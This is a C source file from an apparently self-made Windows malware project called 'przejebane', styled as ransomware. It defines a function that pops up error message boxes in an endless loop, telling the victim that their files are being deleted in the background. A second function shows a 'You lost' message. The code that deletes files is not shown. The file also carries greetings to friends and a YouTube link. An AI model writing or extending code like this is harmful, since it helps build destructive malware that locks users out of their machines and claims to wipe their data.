#include "przejebane.h"

VOID
WINAPI
AnnounceInfection(
	VOID
)
{
	for ( ;; )
	{
		MessageBoxW( NULL, L"Your computer has been infected by the przejebane ransomware, but you do not get your files back, they are currently being deleted in the background with no warning (already running programs do not get affected).\n\nHowever, you can still try to salvage this. You just have to spam ''W Kimiberry'' (creator of przejebane) in the chat.\n\nGreetings to some of my friends btw.\nHello VenraTech (redkidd), NTFSFormatted502, drumstickguy, Maxi Toys and UltraDasher965!\n\nTell me some questions about the ransomware here!\nhttps://www.youtube.com/@kimiberryYT", L"FUCKED", MB_OK | MB_ICONERROR );
		Sleep( 10 );
	}
}

VOID
WINAPI
EndMessage(
	VOID
)
{
	MessageBoxW( NULL, L"You failed to protect your computer.", L"You lost.", MB_OK | MB_ICONERROR );
}